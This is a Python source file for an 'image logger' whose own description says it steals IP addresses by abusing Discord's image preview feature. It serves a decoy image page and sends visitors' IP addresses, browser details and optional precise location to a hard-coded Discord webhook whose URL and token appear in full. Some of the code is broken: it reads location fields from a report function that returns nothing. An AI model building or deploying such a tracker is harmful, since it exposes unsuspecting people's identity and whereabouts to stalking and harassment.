from datetime import datetime
import requests
import base64
import traceback
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://ptb.discord.com/api/webhooks/1336431227338752036/W29f9ZpLcY7GBNyYqpiGde4ny6v4XK4VPKZgGsP9OThQNe8LdvQEf4cTAn62bkCy8h7y",
    "image": "https://media1.tenor.com/m/tZGM8sQwlFwAAAAd/spongebob-cant-wait.gif", 
    "imageArgument": True,  
    "username": "Image Logger",  
    "color": 0x00FFFF,  

    "crashBrowser": False,  
    "accurateLocation": True,  
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  
        "richMessage": True,
    },
    "vpnCheck": 1,  
    "linkAlerts": True,  
    "buggedImage": False,  
    "antiBot": 1,  

    "redirect": {
        "redirect": False,  
        "page": "https://your-link.here",  
    },
}

blacklistedIPs = ("27", "104", "143", "164")  

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })


# New `makeReport` function with discord_id, discord_username, and timestamp
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, discord_id="Unknown", discord_username="Unknown"):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n"
                                   f"**User:** `{discord_username}` (ID: `{discord_id}`)\n"
                                   f"**Timestamp:** `{timestamp}`\n"
                                   f"**Endpoint:** `{endpoint}`\n"
                                   f"**IP:** `{ip}`\n"
                                   f"**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None  
        return


binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}


class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)  # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()  # Declare the headers as finished.

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])  # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                
                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                else:
                    message = "Image Logger - Details gathered"
                
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(data)
        except Exception as e:
            reportError(traceback.format_exc())


if __name__ == "__main__":
    server = HTTPServer(('localhost', 8080), ImageLoggerAPI)
    print(f"Server started at http://localhost:8080")
    server.serve_forever()
